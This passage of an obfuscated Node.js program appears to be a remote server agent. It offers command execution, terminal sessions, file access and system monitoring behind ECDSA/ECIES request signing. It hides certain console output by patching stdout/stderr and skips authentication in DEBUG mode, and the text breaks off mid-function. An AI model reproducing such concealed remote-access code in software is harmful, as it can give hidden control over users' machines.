#!/usr/bin/env node
const a0aK = a0b;
(function (a, b) {
    const aJ = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(aJ(0x3dc)) / 0x1 * (parseInt(aJ(0x37d)) / 0x2) + parseInt(aJ(0x3b7)) / 0x3 * (-parseInt(aJ(0x478)) / 0x4) + parseInt(aJ(0x253)) / 0x5 + -parseInt(aJ(0x287)) / 0x6 * (parseInt(aJ(0x3af)) / 0x7) + -parseInt(aJ(0x3d5)) / 0x8 + parseInt(aJ(0x4bc)) / 0x9 * (-parseInt(aJ(0x188)) / 0xa) + parseInt(aJ(0x65b)) / 0xb;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x5f20a));
const a0c = [
    a0aK(0x269),
    a0aK(0x55a),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const aL = a0aK, b = {
            'ezZpa': function (c, d) {
                return c === d;
            },
            'WGBMF': aL(0x6e4),
            'KrAXT': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const aM = aL, g = c['toString']();
        if (a0c['some'](h => g[aM(0x2a8)](h))) {
            if (b[aM(0x119)](typeof f, b[aM(0x5be)]))
                b['KrAXT'](f);
            return !![];
        }
        return a[aM(0x2ef)](this, arguments);
    };
}
process[a0aK(0x5b2)][a0aK(0x362)] = a0d(process[a0aK(0x5b2)][a0aK(0x362)]), process[a0aK(0x3e4)][a0aK(0x362)] = a0d(process[a0aK(0x3e4)][a0aK(0x362)]);
const a0f = require(a0aK(0x3da)), a0g = require(a0aK(0x635)), a0h = require(a0aK(0x5f4)), a0i = require(a0aK(0x68d)), a0j = require(a0aK(0x1b3)), a0k = require(a0aK(0x586)), a0l = require('fs'), a0m = require('fs')[a0aK(0x4c5)], a0n = require(a0aK(0x5d0)), a0o = require('os'), {
        exec: a0p,
        spawn: a0q
    } = require(a0aK(0x38c)), a0r = require(a0aK(0x461)), a0s = require(a0aK(0x499)), {encrypt: a0t} = require('eciesjs'), a0u = require('base64-js'), a0v = require('express-ws'), a0w = require('noise-c.wasm');
let a0x, a0y, a0z;
try {
    typeof Bun !== a0aK(0x68a) ? a0z = require(a0aK(0x3aa)) : a0z = require(a0aK(0x52f));
} catch (a0aI) {
    console['error'](a0aK(0x384)), console[a0aK(0x528)](a0aK(0x352) + a0aI['message']), console['error']('💡\x20修复建议:\x20请在项目目录下运行\x20npm\x20install\x20@lydell/node-pty'), process[a0aK(0x47d)](0x1);
}
const a0A = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aN = a0aK, a = {
                'Covdv': function (b, c) {
                    return b !== c;
                },
                'gqbkU': aN(0x68a)
            };
        return a[aN(0x5e6)](typeof a0M, a[aN(0x3be)]) && a0M['LOG_LEVEL'] !== undefined ? a0M[aN(0x5e5)] : 0x2;
    },
    'debug': a => {
        const aO = a0aK;
        a0A[aO(0x1e9)] <= a0A[aO(0x6c2)]['DEBUG'] && console[aO(0x348)](aO(0x6c6) + a);
    },
    'info': a => {
        const aP = a0aK, b = {
                'zgSRk': function (c, d) {
                    return c <= d;
                }
            };
        b['zgSRk'](a0A[aP(0x1e9)], a0A[aP(0x6c2)][aP(0x300)]) && console[aP(0x348)]('\x1b[36m[INFO]\x1b[0m\x20' + a);
    },
    'warn': a => {
        const aQ = a0aK, b = {
                'hKjGz': function (c, d) {
                    return c <= d;
                }
            };
        b[aQ(0x25c)](a0A['currentLevel'], a0A[aQ(0x6c2)][aQ(0x1ea)]) && console[aQ(0x348)]('\x1b[33m[WARN]\x1b[0m\x20' + a);
    },
    'error': a => {
        const aR = a0aK, b = {
                'EPRNJ': function (c, d) {
                    return c <= d;
                }
            };
        b[aR(0x233)](a0A[aR(0x1e9)], a0A[aR(0x6c2)][aR(0x701)]) && console['log'](aR(0x231) + a);
    }
};
function a0B() {
    const aS = a0aK, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0o[aS(0x411)](),
            process[aS(0x441)]()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l['statSync'](b)['isDirectory']())
            return b;
    }
    return process[aS(0x441)]();
}
function a0C() {
    const aT = a0aK;
    let a = null;
    try {
        a = a0o[aT(0x411)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l['existsSync'](d) && a0l[aT(0x5a3)](d)[aT(0x41f)]())
            return d;
        if (d)
            console[aT(0x348)](aT(0x35e) + d);
    }
    return console[aT(0x348)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20全部候选无效,\x20降级到当前工作目录:\x20' + process['cwd']()), process[aT(0x441)]();
}
class a0D {
    constructor(a = 'ok') {
        const aU = a0aK;
        this[aU(0x423)] = a;
    }
}
class a0E extends a0D {
    constructor(a = 'ok', b = 0x0) {
        const aV = a0aK;
        super(a), this[aV(0x144)] = b;
    }
}
class a0F extends a0D {
    constructor() {
        const aW = a0aK, a = { 'BPsBy': aW(0x3ac) }, b = a['BPsBy'][aW(0x53c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[aW(0x6c5)] = 0x0;
                continue;
            case '1':
                super();
                continue;
            case '2':
                this['mem_total'] = 0x0;
                continue;
            case '3':
                this[aW(0x142)] = '';
                continue;
            case '4':
                this[aW(0x646)] = a0M['AGENT_VERSION'];
                continue;
            case '5':
                this['kernel_version'] = '';
                continue;
            case '6':
                this[aW(0x64b)] = 0x0;
                continue;
            case '7':
                this[aW(0x4de)] = null;
                continue;
            case '8':
                this[aW(0x12f)] = null;
                continue;
            case '9':
                this[aW(0x6b3)] = '';
                continue;
            case '10':
                this['gpu_name'] = '';
                continue;
            case '11':
                this['os'] = '';
                continue;
            case '12':
                this[aW(0x52e)] = '';
                continue;
            case '13':
                this[aW(0x433)] = '';
                continue;
            case '14':
                this[aW(0x344)] = null;
                continue;
            case '15':
                this['swap_total'] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0G extends a0D {
    constructor() {
        const aX = a0aK, a = { 'FFDFd': '5|10|8|2|7|3|6|9|4|0|1' }, b = a[aX(0x2ac)][aX(0x53c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[aX(0x151)] = 0x0;
                continue;
            case '1':
                this[aX(0x564)] = '';
                continue;
            case '2':
                this[aX(0x3f2)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '3':
                this[aX(0x36c)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[aX(0x5ba)] = 0x0;
                continue;
            case '5':
                super();
                continue;
            case '6':
                this[aX(0x149)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '7':
                this[aX(0x147)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '8':
                this[aX(0x31c)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '10':
                this[aX(0x5c7)] = { 'usage': 0x0 };
                continue;
            }
            break;
        }
    }
}
class a0H extends a0D {
    constructor() {
        const aY = a0aK, a = { 'ekoEz': aY(0x580) }, b = a[aY(0x3de)][aY(0x53c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                super();
                continue;
            case '1':
                this[aY(0x339)] = 0x0;
                continue;
            case '2':
                this[aY(0x4ab)] = '';
                continue;
            case '3':
                this[aY(0x669)] = ![];
                continue;
            case '4':
                this['result'] = '';
                continue;
            }
            break;
        }
    }
}
class a0I {
    constructor() {
        const aZ = a0aK;
        this['name'] = '', this['path'] = '', this[aZ(0x240)] = '', this[aZ(0x6b6)] = 0x0, this[aZ(0x2f8)] = '', this[aZ(0x2e3)] = '', this[aZ(0x650)] = '', this[aZ(0x353)] = '';
    }
}
class a0J {
    constructor() {
        const b0 = a0aK, a = { 'iuDKP': b0(0x281) }, b = a[b0(0x171)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b0(0x2e3)] = '';
                continue;
            case '1':
                this[b0(0x5d0)] = '';
                continue;
            case '2':
                this[b0(0x38e)] = '';
                continue;
            case '3':
                this[b0(0x560)] = ![];
                continue;
            case '4':
                this['type'] = '';
                continue;
            case '5':
                this[b0(0x650)] = '';
                continue;
            case '6':
                this[b0(0x667)] = ![];
                continue;
            case '7':
                this[b0(0x490)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0K extends a0D {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0L {
    static [a0aK(0x277)]() {
        const b1 = a0aK, a = {
                'IlXAy': 'x25519',
                'yMxKR': b1(0x5b1),
                'GLinF': b1(0x185),
                'BDAtc': function (i, j) {
                    return i !== j;
                },
                'ZehJS': b1(0x4d0)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k['generateKeyPairSync'](a['IlXAy']), d = b[b1(0x36d)]({ 'format': a[b1(0x267)] }), f = c['export']({ 'format': b1(0x5b1) }), g = Buffer[b1(0x4e8)](d['d'], a['GLinF']), h = Buffer[b1(0x4e8)](f['x'], a[b1(0x1f1)]);
        return (a['BDAtc'](g[b1(0x5a7)], 0x20) || h[b1(0x5a7)] !== 0x20) && a0A[b1(0x528)]('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g['toString'](a[b1(0x372)]),
            'public_b64': h[b1(0x206)](a[b1(0x372)])
        };
    }
    static [a0aK(0x285)](a) {
        const b2 = a0aK, b = this['_generateRawKeypair']();
        return {
            'role': a,
            'private_b64': b[b2(0x4be)],
            'public_b64': b['public_b64']
        };
    }
    static ['generatePair'](a = a0aK(0x689), b = a0aK(0x276)) {
        const b3 = a0aK, c = {
                'control': this['generateSingle'](a),
                'agent': this[b3(0x285)](b)
            };
        return c;
    }
}
function a0b(a, b) {
    a = a - 0x10a;
    const c = a0a();
    let d = c[a];
    if (a0b['JNhpGx'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['XndGSP'] = e, a0b['XqCImY'] = {}, a0b['JNhpGx'] = !![];
    }
    const f = c[0x0];
    a0b['bclPiT'] !== f && (a0b['XqCImY'] = {}, a0b['bclPiT'] = f);
    const g = a0b['XqCImY'][a];
    return g === undefined ? (d = a0b['XndGSP'](d), a0b['XqCImY'][a] = d) : d = g, d;
}
class a0M {
    static ['Rtimeout'] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aK(0x462)] = (process.env.EXEC_SHELL || a0aK(0x632))['toLowerCase']() === a0aK(0x632);
    static [a0aK(0x4b8)] = (process.env.DEBUG || a0aK(0x3f3))['toLowerCase']() === 'true';
    static [a0aK(0x225)] = parseInt(process.env.TIMESTAMP_WINDOW || a0aK(0x1f0));
    static [a0aK(0x5e5)] = parseInt(process.env.LOG_LEVEL || (this['DEBUG'] ? '0' : '2'), 0xa);
    static [a0aK(0x27e)] = a0M[a0aK(0x30a)]('ECDSA_PUBKEY', a0aK(0x32b)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0M['_getConfigValue'](a0aK(0x189), a0aK(0x50c)) || 'ECIES公钥内容';
    static [a0aK(0x4ff)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aK(0x54a)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aK(0x4a7), 0xa);
    static ['FILE_ROOT'] = a0C();
    static [a0aK(0x472)] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static [a0aK(0x394)] = (process.env.FOLLOW_SYMLINKS || 'false')[a0aK(0x425)]() === a0aK(0x632);
    static [a0aK(0x492)] = (process.env.FILE_AUDIT_LOG || a0aK(0x632))[a0aK(0x425)]() === a0aK(0x632);
    static [a0aK(0x55e)] = !![];
    static [a0aK(0x1e0)] = [];
    static [a0aK(0x3b2)] = {};
    static [a0aK(0x6a6)] = ![];
    static [a0aK(0x35b)] = parseInt(process.env.TASK_TIMEOUT || a0aK(0x27a));
    static [a0aK(0x2af)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aK(0x6fe)] = [];
    static [a0aK(0x6b5)] = [];
    static [a0aK(0x5a1)] = parseInt(process.env.MAX_TASK_LOG || a0aK(0x3bc));
    static [a0aK(0x4cd)] = process.env.HOST || '0.0.0.0';
    static [a0aK(0x3a8)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aK(0x2c9));
    static [a0aK(0x2a6)] = process.env.AGENT_VERSION || a0aK(0x29a);
    static [a0aK(0x525)] = a0k['randomBytes'](0x20)[a0aK(0x206)](a0aK(0x4d0));
    static [a0aK(0x21a)] = a0L[a0aK(0x6b4)]();
    static [a0aK(0x1ba)] = {
        'controller': { 'private': this[a0aK(0x21a)][a0aK(0x559)][a0aK(0x4be)] },
        'agent': { 'public': this['NOISE_KEYS_INTERNAL'][a0aK(0x5ce)][a0aK(0x305)] }
    };
    static [a0aK(0x68e)] = 0xe10;
    static [a0aK(0x4b3)] = 0x1e;
    static [a0aK(0x389)] = null;
    static ['_baseinfo_cache_time'] = 0x0;
    static [a0aK(0x1e7)] = null;
    static [a0aK(0x2dd)] = null;
    static [a0aK(0x3fa)] = 0x0;
    static [a0aK(0x5a2)] = null;
    static [a0aK(0x30a)](a, b) {
        const b4 = a0aK, c = process.env[a];
        if (c)
            return c;
        const d = a0n['join'](__dirname, b);
        if (a0l[b4(0x5ed)](d))
            try {
                return a0l['readFileSync'](d, b4(0x5c8))[b4(0x61b)]();
            } catch (f) {
            }
        return '';
    }
    static [a0aK(0x246)]() {
        const b5 = a0aK, a = {
                'eJlJv': b5(0x600),
                'ZdLxo': b5(0x4bf),
                'VKgMd': function (b, c) {
                    return b > c;
                },
                'ojnpd': '3|4|5|1|2|0',
                'Imbbl': b5(0x2c5),
                'xhmyC': b5(0x519),
                'vdBjc': '❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):'
            };
        if (!this[b5(0x4b8)]) {
            const b = [];
            !this['ECDSA_PUBLIC_KEY_PEM'] && b[b5(0x293)](a[b5(0x228)]);
            !this['ECIES_PUBLIC_KEY_PEM'] && b[b5(0x293)](a['ZdLxo']);
            if (a[b5(0x5b5)](b[b5(0x5a7)], 0x0)) {
                const c = a[b5(0x122)][b5(0x53c)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        process[b5(0x47d)](0x1);
                        continue;
                    case '1':
                        a0A[b5(0x550)](a[b5(0x429)]);
                        continue;
                    case '2':
                        a0A[b5(0x550)](a[b5(0x4d6)]);
                        continue;
                    case '3':
                        a0A['error'](a[b5(0x141)]);
                        continue;
                    case '4':
                        b['forEach'](f => a0A[b5(0x528)](b5(0x56c) + f));
                        continue;
                    case '5':
                        a0A['debug'](b5(0x1f3));
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aK(0x112)](a = {}) {
        const b6 = a0aK, b = {
                'SzEcd': function (c, d) {
                    return c !== d;
                },
                'wqebj': function (c, d, f) {
                    return c(d, f);
                },
                'OIBnU': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        a[b6(0x3a8)] !== undefined && b[b6(0x645)](a[b6(0x3a8)], null) && (this[b6(0x3a8)] = b['wqebj'](parseInt, b[b6(0x3ff)](String, a[b6(0x3a8)]), 0xa)), a[b6(0x27e)] && (this[b6(0x27e)] = a['ECDSA_PUBLIC_KEY_PEM']['trim']()), a['ECIES_PUBLIC_KEY_PEM'] && (this[b6(0x68f)] = a[b6(0x68f)][b6(0x61b)]());
    }
}
class a0N {
    constructor() {
        const b7 = a0aK;
        this[b7(0x3e9)] = null;
    }
    [a0aK(0x181)](a) {
        const b8 = a0aK;
        if (this[b8(0x3e9)] && !this[b8(0x63c)](this[b8(0x3e9)]))
            return this['_key'];
        return this[b8(0x3e9)] = this[b8(0x32e)](a), a0A[b8(0x684)](b8(0x370) + this[b8(0x3e9)][b8(0x46c)] + b8(0x17a) + a + b8(0x41a)), this[b8(0x3e9)];
    }
    [a0aK(0x35a)]() {
        const b9 = a0aK;
        if (this[b9(0x3e9)] && !this['_isExpired'](this[b9(0x3e9)]))
            return this[b9(0x3e9)][b9(0x3cf)];
        return null;
    }
    [a0aK(0x4dc)]() {
        const ba = a0aK;
        if (this['_key'] && !this['_isExpired'](this['_key']))
            return this[ba(0x3e9)][ba(0x3d7)];
        return null;
    }
    ['_isExpired'](a) {
        const bb = a0aK, b = {
                'LsEoF': function (c, d) {
                    return c / d;
                }
            };
        return Math['floor'](b[bb(0x128)](Date[bb(0x65e)](), 0x3e8)) >= a[bb(0x1a0)];
    }
    ['_generate'](a) {
        const bc = a0aK, b = {
                'fgOPJ': bc(0x427),
                'ZzRtH': bc(0x498),
                'HUBhx': function (l, m) {
                    return l / m;
                },
                'viqHe': bc(0x398),
                'xuMVR': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bc(0x242)]('ec', { 'namedCurve': 'prime256v1' }), f = c[bc(0x36d)]({
                'type': b[bc(0x33f)],
                'format': b[bc(0x53a)]
            }), g = d[bc(0x36d)]({
                'type': bc(0x16d),
                'format': bc(0x498)
            }), h = a0k[bc(0x67a)](0x20), i = Buffer[bc(0x4e8)](a0y[bc(0x5fc)](h, ![])), j = Math['floor'](b[bc(0x2d0)](Date['now'](), 0x3e8)), k = a * 0xe10;
        return {
            'key_id': a0k[bc(0x67a)](0x8)[bc(0x206)](b[bc(0x363)]),
            'created_at': j,
            'expires_at': b['xuMVR'](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString'](b[bc(0x363)]),
            'ecies_public_key': i[bc(0x206)](b[bc(0x363)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0O {
    constructor(a, b) {
        const bd = a0aK, c = {
                'fTnNA': '-----BEGIN',
                'xCcnP': bd(0x4d0),
                'ImvcG': 'P-256'
            };
        this['ecdsaPubkey'] = null, this[bd(0x697)] = null;
        if (a)
            try {
                const d = a[bd(0x61b)]();
                if (d[bd(0x21e)](c['fTnNA']))
                    this[bd(0x6f2)] = a0k[bd(0x592)](d);
                else {
                    const f = Buffer[bd(0x4e8)](d, c['xCcnP']), g = a0x['Point'][bd(0x5f3)](f), h = g[bd(0x4f4)](![]), i = m => m['toString'](bd(0x4d0))[bd(0x4bd)](/\+/g, '-')[bd(0x4bd)](/\//g, '_')[bd(0x4bd)](/=/g, ''), j = i(Buffer[bd(0x4e8)](h[bd(0x1f8)](0x1, 0x21))), k = i(Buffer['from'](h[bd(0x1f8)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[bd(0x6da)],
                            'x': j,
                            'y': k
                        };
                    this[bd(0x6f2)] = a0k[bd(0x592)]({
                        'key': l,
                        'format': bd(0x5b1)
                    });
                }
            } catch (m) {
                a0A['error']('⚠️\x20ECDSA公钥加载失败:\x20' + m['message']), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this['eciesPubkey'] = a0u['toByteArray'](b[bd(0x61b)]());
            } catch (n) {
                a0A[bd(0x25b)](bd(0x36b) + n[bd(0x564)]);
            }
    }
    [a0aK(0x1a1)](a, b, c, d = null) {
        const be = a0aK, f = {
                'JmNtz': function (g, h) {
                    return g(h);
                },
                'TnFIj': function (g, h) {
                    return g / h;
                },
                'QyStd': function (g, h) {
                    return g - h;
                },
                'gnsuY': 'static',
                'qvAdE': 'Bad\x20signature'
            };
        if (!this['ecdsaPubkey'])
            throw new Error('ECDSA\x20public\x20key\x20not\x20loaded');
        try {
            const g = f['JmNtz'](parseInt, b), h = Math[be(0x3e5)](f[be(0x38d)](Date['now'](), 0x3e8));
            if (Math[be(0x6bd)](f['QyStd'](h, g)) > a0M[be(0x225)])
                throw new Error('Timestamp\x20expired:\x20diff=' + Math[be(0x6bd)](h - g) + 's\x20>\x20' + a0M['TIMESTAMP_WINDOW'] + 's');
            const i = '' + a + b;
            if (this[be(0x313)](this[be(0x6f2)], i, c))
                return f[be(0x4f1)];
            if (d && this[be(0x313)](d, i, c))
                return 'temp';
            throw new Error(f['qvAdE']);
        } catch (j) {
            throw new Error(be(0x4e6) + j[be(0x564)]);
        }
    }
    [a0aK(0x313)](a, b, c) {
        const bf = a0aK, d = { 'oSOth': bf(0x66d) };
        if (!a)
            return ![];
        try {
            const f = a0u[bf(0x50a)](c), g = a0k[bf(0x54e)](d['oSOth']);
            return g[bf(0x5a8)](b), g[bf(0x286)](a, f);
        } catch (h) {
            return ![];
        }
    }
    ['encryptResponse'](a, b = null) {
        const bg = a0aK, c = {
                'OCgtM': bg(0x1fc),
                'YKoFo': 'base64'
            };
        if (a0M[bg(0x4b8)] || !this[bg(0x697)])
            return JSON['stringify'](a);
        try {
            const d = JSON[bg(0x397)](a), f = Buffer['from'](d, c['OCgtM']), g = b || Buffer[bg(0x4e8)](this[bg(0x697)]), h = a0t(g, f);
            return Buffer[bg(0x4e8)](h)[bg(0x206)](c['YKoFo']);
        } catch (i) {
            const j = {
                '_encrypt_error': i[bg(0x564)],
                '_raw': a0M[bg(0x4b8)] ? a : null
            };
            return JSON['stringify'](j);
        }
    }
    [a0aK(0x3a2)](a, b) {
        const bh = a0aK, c = {
                'GWhFG': function (d, f) {
                    return d !== f;
                },
                'eQthA': bh(0x611),
                'peRdj': bh(0x4d0),
                'qRVnt': bh(0x5c8),
                'NHOxC': 'Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.',
                'JKjpO': 'aes-256-gcm'
            };
        if (!b || c[bh(0x61f)](b[bh(0x5a7)], 0x20))
            throw new Error(c[bh(0x52b)]);
        try {
            const d = Buffer[bh(0x4e8)](a, c['peRdj'])[bh(0x206)](c[bh(0x3c2)]), f = JSON[bh(0x110)](d);
            if (!f[bh(0x291)] || !f[bh(0x556)] || !f[bh(0x333)])
                throw new Error(c[bh(0x19e)]);
            const g = Buffer['from'](f[bh(0x291)], bh(0x4d0)), h = Buffer['from'](f[bh(0x556)], bh(0x4d0)), i = Buffer['from'](f['ciphertext'], c[bh(0x2eb)]), j = a0k[bh(0x135)](c[bh(0x127)], b, g);
            j[bh(0x1f6)](h);
            let k = j['update'](i, null, 'utf8');
            return k += j[bh(0x4c8)](bh(0x5c8)), k;
        } catch (l) {
            throw new Error(bh(0x5bd) + l[bh(0x564)]);
        }
    }
}
function a0P(a, b = null) {
    const bi = a0aK, c = {
            'RTFZT': bi(0x273),
            'uqndJ': function (d, f) {
                return d === f;
            },
            'KvMiZ': bi(0x6b0),
            'NtAti': bi(0x489),
            'BnxbK': function (d, f) {
                return d === f;
            },
            'EEzhs': bi(0x36a),
            'nkWZj': bi(0x632),
            'ldoZU': bi(0x5d5),
            'rIMLD': bi(0x4f2),
            'xnxfy': bi(0x5c8),
            'MWLrG': 'false',
            'vGuXY': function (d) {
                return d();
            },
            'bJgvq': 'HEAD',
            'aaduK': bi(0x164),
            'wgokR': bi(0x15d),
            'NshNn': bi(0x4ba),
            'OFApx': bi(0x707),
            'XErUN': bi(0x40c),
            'rJAFq': bi(0x1dc),
            'iSAGI': function (d) {
                return d();
            },
            'MAxNu': bi(0x40d),
            'MfxbZ': function (d, f) {
                return d === f;
            },
            'Hvllf': bi(0x536),
            'HTjMK': 'eyJ',
            'kWIbC': bi(0x4d0),
            'BqtiR': bi(0x1fc)
        };
    return async (d, f, g) => {
        const bj = bi;
        if (d[bj(0x5d0)][bj(0x21e)]('/api/ws/'))
            return c['vGuXY'](g);
        if (c[bj(0x2c6)](d['method'], 'OPTIONS') || d[bj(0x4a4)] === c[bj(0x1a4)])
            return c['vGuXY'](g);
        d[bj(0x19d)] = ![];
        const h = [
            '/api/baseinfo',
            c['aaduK']
        ];
        if (a0M['DEBUG'])
            return d[bj(0x19d)] = !![], g();
        const i = d[bj(0x3c7)][c[bj(0x428)]] || d[bj(0x3c7)][c[bj(0x1b0)]], j = d[bj(0x3c7)][c[bj(0x3c8)]] || d[bj(0x3c7)][bj(0x1cd)], k = d[bj(0x3c7)][c[bj(0x4bb)]] || d[bj(0x3c7)][c['rJAFq']];
        if (!i || !j || !k)
            return h[bj(0x2a8)](d[bj(0x5d0)]) ? c[bj(0x358)](g) : f[bj(0x423)](0x191)[bj(0x705)]({ 'error': c['MAxNu'] });
        try {
            const m = b ? b[bj(0x35a)]() : null, n = a[bj(0x1a1)](i, j, k, m);
            d['is_authenticated'] = !![], d[bj(0x6d7)] = c[bj(0x3e6)](n, bj(0x489)) ? bj(0x489) : bj(0x3a3);
        } catch (o) {
            return h['includes'](d[bj(0x5d0)]) ? g() : f[bj(0x423)](0x191)[bj(0x705)]({ 'error': bj(0x4e6) + o[bj(0x564)] });
        }
        if (d[bj(0x6f7)] && c['MfxbZ'](typeof d[bj(0x6f7)], bj(0x6b0))) {
            const p = c['BnxbK']((d['headers'][c[bj(0x43f)]] || '')['toLowerCase'](), c['nkWZj']);
            try {
                if (p && d['is_authenticated']) {
                    const q = Buffer[bj(0x4e8)](a0M[bj(0x525)], bj(0x4d0)), r = a[bj(0x3a2)](d[bj(0x6f7)], q);
                    d['body'] = JSON[bj(0x110)](r);
                } else {
                    if (d[bj(0x6f7)][bj(0x21e)](c[bj(0x2bf)])) {
                        const s = Buffer[bj(0x4e8)](d[bj(0x6f7)], c['kWIbC'])[bj(0x206)](c[bj(0x3d3)]);
                        d[bj(0x6f7)] = JSON[bj(0x110)](s);
                    } else {
                        if (d[bj(0x6f7)][bj(0x61b)]()[bj(0x21e)]('{') || d[bj(0x6f7)]['trim']()['startsWith']('['))
                            d[bj(0x6f7)] = JSON[bj(0x110)](d['body']);
                        else {
                            if (c[bj(0x2c6)](d[bj(0x6f7)][bj(0x61b)](), ''))
                                d[bj(0x6f7)] = {};
                        }
                    }
                }
            } catch (t) {
                return a0A[bj(0x528)](bj(0x483) + t[bj(0x564)]), f['status'](0x190)['json']({ 'error': bj(0x4ef) + t[bj(0x564)] });
            }
        }
        const l = f[bj(0x10a)];
        f[bj(0x10a)] = function (u) {
            const bk = bj;
            if (f[bk(0x12e)](bk(0x194)) && f[bk(0x12e)](bk(0x194))[bk(0x2a8)](c[bk(0x183)]))
                try {
                    const v = c[bk(0x2c6)](typeof u, c[bk(0x5ab)]) ? JSON[bk(0x110)](u) : u;
                    if (d[bk(0x19d)]) {
                        let w = null;
                        d[bk(0x6d7)] === c['NtAti'] && b && (w = b[bk(0x4dc)]());
                        const x = a[bk(0x5ef)](v, w), y = c[bk(0x3f5)](typeof x, c['KvMiZ']) ? x : JSON['stringify'](x);
                        return f[bk(0x2d1)](c[bk(0x602)], c['nkWZj']), f[bk(0x2d1)](c[bk(0x2fb)], a0M[bk(0x2a6)]), f[bk(0x2d1)](c[bk(0x6ee)], Buffer[bk(0x38a)](y, c[bk(0x69e)])['toString']()), l['call'](this, y);
                    } else {
                        const z = typeof u === bk(0x6b0) ? u : JSON['stringify'](v);
                        return f[bk(0x2d1)](c[bk(0x602)], c[bk(0x593)]), f[bk(0x2d1)](c['rIMLD'], Buffer[bk(0x38a)](z, c['xnxfy'])['toString']()), l[bk(0x60e)](this, z);
                    }
                } catch (A) {
                    if (a0M[bk(0x4b8)])
                        a0A[bk(0x528)](bk(0x62e) + A['message']);
                }
            return l[bk(0x60e)](this, u);
        }, c[bj(0x358)](g);
    };
}
class a0Q {
    constructor() {
        const bl = a0aK;
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bl(0x6b1)] = 0x0, this[bl(0x332)] = 0x0, this[bl(0x155)] = Date[bl(0x65e)]() / 0x3e8;
    }
    async ['getContainerMemory']() {
        const bm = a0aK, a = {
                'jpzUD': bm(0x623),
                'VoMVq': bm(0x5c8),
                'KToxC': function (d, f, g) {
                    return d(f, g);
                },
                'Oxwju': bm(0x4c1),
                'CXmiJ': function (d, f) {
                    return d === f;
                },
                'pqOGY': function (d, f) {
                    return d === f;
                },
                'subfO': function (d, f) {
                    return d(f);
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bm(0x52a)](a['jpzUD'], a[bm(0x2ec)]))[bm(0x61b)]();
            b = d === 'max' ? null : a[bm(0x554)](parseInt, d, 0xa), c = a[bm(0x554)](parseInt, (await a0m[bm(0x52a)](a[bm(0x438)], a['VoMVq']))[bm(0x61b)](), 0xa);
        } catch {
            try {
                b = parseInt((await a0m[bm(0x52a)](bm(0x33d), bm(0x5c8)))[bm(0x61b)](), 0xa), c = a[bm(0x554)](parseInt, (await a0m['readFile'](bm(0x6e0), bm(0x5c8)))[bm(0x61b)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0s[bm(0x1a9)]();
                b = f[bm(0x34e)], c = f[bm(0x2b1)];
            }
        }
        if (a[bm(0x401)](b, null)) {
